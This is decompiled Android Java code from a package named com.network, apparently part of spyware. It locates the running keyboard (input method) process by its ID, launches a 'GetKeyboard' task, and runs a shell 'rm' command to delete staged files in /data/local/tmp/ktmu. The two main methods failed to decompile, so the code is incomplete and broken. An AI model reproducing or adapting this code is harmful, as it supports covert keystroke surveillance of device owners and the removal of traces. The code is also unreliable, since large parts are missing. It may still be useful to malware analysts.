package com.network.d;

import android.app.ActivityManager;
import android.content.Context;
import android.os.Handler;
import android.provider.Settings;
import com.network.android.m;

public final class a {

    /* renamed from: a */
    static String f138a = "/data/local/tmp/ktmu";
    static int b = 0;

    public static void a() {
        try {
            String str = "rm " + f138a + "/*.*";
            com.network.android.c.a.a.a("deleteAllKsFiles calling: " + str);
            m.c(str);
        } catch (Throwable th) {
            com.network.android.c.a.a.a("deleteAllKsFiles exception: " + th.getMessage() + " " + th.getCause());
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:34:0x0171 A[SYNTHETIC, Splitter:B:34:0x0171] */
    /* JADX WARNING: Removed duplicated region for block: B:37:0x0176 A[Catch:{ Throwable -> 0x017b }] */
    /* JADX WARNING: Removed duplicated region for block: B:43:0x0195 A[SYNTHETIC, Splitter:B:43:0x0195] */
    /* JADX WARNING: Removed duplicated region for block: B:46:0x019a A[Catch:{ Throwable -> 0x019e }] */
    /* JADX WARNING: Removed duplicated region for block: B:65:? A[RETURN, SYNTHETIC] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static void a(android.content.Context r8) {
        /*
        // Method dump skipped, instructions count: 479
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.d.a.a(android.content.Context):void");
    }

    public static void a(Handler handler, Context context) {
        com.network.android.c.a.a.a("GetKeyboard getKeyboard START");
        handler.post(new b(context));
    }

    /* JADX WARNING: Code restructure failed: missing block: B:54:0x0254, code lost:
        r0 = th;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:55:0x0255, code lost:
        r1 = r2;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:86:0x0407, code lost:
        r0 = th;
     */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Removed duplicated region for block: B:59:0x0276 A[SYNTHETIC, Splitter:B:59:0x0276] */
    /* JADX WARNING: Removed duplicated region for block: B:62:0x027b A[Catch:{ Throwable -> 0x02a9 }] */
    /* JADX WARNING: Removed duplicated region for block: B:68:0x02ce A[SYNTHETIC, Splitter:B:68:0x02ce] */
    /* JADX WARNING: Removed duplicated region for block: B:71:0x02d3 A[Catch:{ Throwable -> 0x03c5 }] */
    /* JADX WARNING: Removed duplicated region for block: B:86:0x0407 A[ExcHandler: all (th java.lang.Throwable), Splitter:B:24:0x00e9] */
    /* JADX WARNING: Removed duplicated region for block: B:98:0x00a4 A[SYNTHETIC] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    static /* synthetic */ void b(android.content.Context r10) {
        /*
        // Method dump skipped, instructions count: 1041
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.d.a.b(android.content.Context):void");
    }

    private static int c(Context context) {
        try {
            com.network.android.c.a.a.a("GetKeyboard getCurrentInputMethodProcessId");
            String string = Settings.Secure.getString(context.getContentResolver(), "default_input_method");
            String substring = string.substring(0, string.indexOf("/"));
            com.network.android.c.a.a.a("GetKeyboard getCurrentInputMethodProcessId input: " + substring);
            for (ActivityManager.RunningAppProcessInfo runningAppProcessInfo : ((ActivityManager) context.getSystemService("activity")).getRunningAppProcesses()) {
                if (runningAppProcessInfo.processName.contains(substring)) {
                    com.network.android.c.a.a.a("GetKeyboard found pid :" + runningAppProcessInfo.pid + ", process.processName:" + runningAppProcessInfo.processName);
                    return runningAppProcessInfo.pid;
                }
            }
        } catch (Throwable th) {
            com.network.android.c.a.a.a("GetKeyboard getCurrentInputMethodProcessId- " + th.getMessage(), th);
        }
        return 0;
    }
}
